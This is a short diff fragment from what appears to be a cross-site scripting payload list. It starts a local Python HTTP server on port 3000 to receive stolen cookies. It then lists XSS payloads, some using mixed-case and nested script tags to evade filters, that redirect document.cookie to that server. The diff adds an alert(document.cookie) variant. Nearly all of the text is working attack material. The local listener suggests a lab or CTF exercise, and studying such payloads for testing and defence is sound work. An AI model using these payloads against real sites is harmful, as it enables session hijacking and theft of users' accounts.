@@ -19,4 +19,5 @@ python3 -m http.server 3000
 ```
 <ScRipT>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
 <scr<script>ipt>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
+<scr<script>ipt>alert(document.cookie)</script>
 ```
